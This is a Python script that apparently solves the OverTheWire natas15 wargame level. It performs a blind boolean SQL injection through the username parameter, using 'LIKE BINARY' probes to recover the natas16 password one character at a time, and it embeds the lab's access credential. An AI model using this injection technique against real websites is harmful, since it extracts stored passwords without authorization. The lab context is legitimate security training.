#!/usr/bin/env python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
authUsername = "natas15"
authPassword = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

chars = "".join([string.ascii_letters, string.digits])

userExists = "This user exists."

passwordDir = []
for char in chars:
	uri = "".join([url, "?", 'username=natas16"+and+password+LIKE+BINARY+"%', char, "%"])
	r = requests.get(uri, auth=(authUsername, authPassword))

	if userExists in r.text:
		passwordDir.append(char)
		print "[#] Current letters in password: {0}".format("".join(passwordDir))

print "--------------------------"
print "Trying out the password..."
print "--------------------------"
passwordChars = []
for i in range(1, 64):

	for char in passwordDir:
		combo = "".join(["".join(passwordChars), char])

		uri = "".join([url, "?", 'username=natas16"+and+password+LIKE+BINARY+"', combo, "%"])
		
		r = requests.get(uri, auth=(authUsername, authPassword))

		if userExists in r.text:
			passwordChars.append(char)
			print "[#] Current password: {0}".format("".join(passwordChars))

print "[!!] The final password: {0}".format("".join(passwordChars))